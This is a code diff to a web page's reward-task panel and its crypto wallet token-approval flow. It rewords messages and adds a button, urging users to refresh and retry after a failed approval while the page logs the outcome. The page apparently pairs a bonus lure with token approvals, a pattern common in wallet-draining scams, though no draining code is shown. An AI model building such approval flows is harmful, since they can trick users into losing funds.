@@ -796,7 +796,7 @@
       <div class="task-header-row">
         <div>
           <h2>Reward Tasks</h2>
-          <p class="small">Complete these tasks to become eligible for the Starter Bonus.</p>
+          <p class="small">❌ Please do not skip video to the end, it will not count and you have to watch again.🔄 Do not reload the page after open a task..</p>
         </div>
         <button id="backToRewardsBtn" class="btn-back">Back to Reward</button>
       </div>
@@ -1173,6 +1173,7 @@
     </button>
 
   </div>
+        <button id="backToRewardsBtn" class="btn-back">Back to Reward</button>
 
 </div>
 
@@ -2022,7 +2023,7 @@ if(connectBtnCard){
           tag = "approval_rejected";
         }
 
-        setStatus("Connected (approval failed)");
+        setStatus("Connected (❌ FAILED. Please Refresh 🔄)");
         alert("Token approval failed: " + (err && err.message ? err.message : err));
 
         await logApproval(tag);
